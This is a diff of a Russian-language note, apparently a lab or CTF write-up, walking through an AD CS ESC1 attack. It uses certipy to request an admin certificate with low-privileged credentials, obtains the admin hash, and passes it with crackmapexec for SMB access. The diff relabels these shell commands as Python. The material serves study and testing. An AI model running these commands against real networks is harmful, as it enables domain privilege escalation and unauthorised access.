@@ -19,18 +19,18 @@ AD CS ESC1 (Active Directory Certificate Services Escalation of Privilege 1)
 ***Пример команды для её эксплуатации:***
 (буду использовать certipy)
 1. Получаем сертификат
-```
-# certipy req -u usuall@user.local -p 'usuall_user_password' -ca Antique_CA -target <CAHostname> -template ForClient -upn admin@user.local -dns <DNSServer>
+```python
+ certipy req -u usuall@user.local -p 'usuall_user_password' -ca Antique_CA -target <CAHostname> -template ForClient -upn admin@user.local -dns <DNSServer>
 ```
 -target <CAHostname> - нам дан только Certificate Template, а информацию о DNS name нужно смотреть в Cartificate Authorities
 -dns <DNSServer> - DNS сервер нам также не дали, надо смотреть в Cartificate Authorities
 2. Получаем хеш
-```
-# certipy auth -pfx <cerf_file_name.pfx> -dc-ip <Dc-IP> 
+```python
+ certipy auth -pfx <cerf_file_name.pfx> -dc-ip <Dc-IP> 
 ```
 -pfx <cerf_file_name.pfx - имя файла, которое получим из вывода первой команды
 -dc-ip <Dc-IP> - айпишник сервера 
 3. Логинимся на target machine (тут можно использовать crackmapexec)
-```
-# crackmapexec smb <ip_of_the_target> -u admin -H :<hash_that_we_got> --shares
+```python
+ crackmapexec smb <ip_of_the_target> -u admin -H :<hash_that_we_got> --shares
 ```
